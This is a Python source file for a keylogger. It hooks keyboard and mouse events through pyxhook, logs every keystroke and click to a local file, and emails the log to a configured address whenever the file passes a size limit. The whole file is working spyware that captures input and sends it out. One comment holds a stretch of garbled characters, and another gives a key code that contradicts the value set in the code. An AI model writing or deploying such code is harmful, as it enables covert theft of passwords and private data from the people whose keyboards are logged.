import pyxhook
import os
import properties
from mailAdapter import MailAdapter


class HookManager:
    settings = properties.load()
    hookman = None
    logfile = os.getcwd() + "/keylog.txt"
    closechar = 49
    mailAd = MailAdapter()
    activeFlag = False
    def __init__(self):
        self.hookman = pyxhook.HookManager()

        # Define our callback to fire when a key is pressed downmfgshdgjf,jfgkjdgkjfhgzkjh768687687694754otu85789451
        self.hookman.KeyDown = self.keyEvent
        # Hook the keyboard
        self.hookman.HookKeyboard()

        self.hookman.MouseAllButtonsDown = self.mouseEvent

        self.hookman.HookMouse()
        # Start our listener
        self.hookman.start()
        self.activeFlag = True

    def keyEvent(self, event):
        fob = open(self.logfile, 'a')
        fob.write(event.Key)
        fob.write('\n')
        fob.close()
        print(event)
        if event.Ascii == self.closechar:  # 96 is the ascii of the grave key (`)
            self.settings.save()
            print("----STOP-----")
            self.hookman.cancel()
            self.activeFlag = False

        if (os.path.getsize(self.logfile) > self.settings.size):
            fob = open(self.logfile, "r+")
            text = fob.read()
            fob.close()
            self.mailAd.send(text, self.settings.address)
            fob = open(self.logfile, "w+")
            fob.close()
        return True


    def mouseEvent(self, event):
        fob = open(self.logfile, 'a')
        fob.write(event.MessageName)
        fob.write('\n')
        fob.close()
        print(event.MessageName)
        if (os.path.getsize(self.logfile) > self.settings.size):
            fob = open(self.logfile, "r+")
            text = fob.read()
            fob.close()
            self.mailAd.send(text, self.settings.address)
            fob = open(self.logfile, "w+")
            fob.close()
        return True

    def isactive(self):
        return self.activeFlag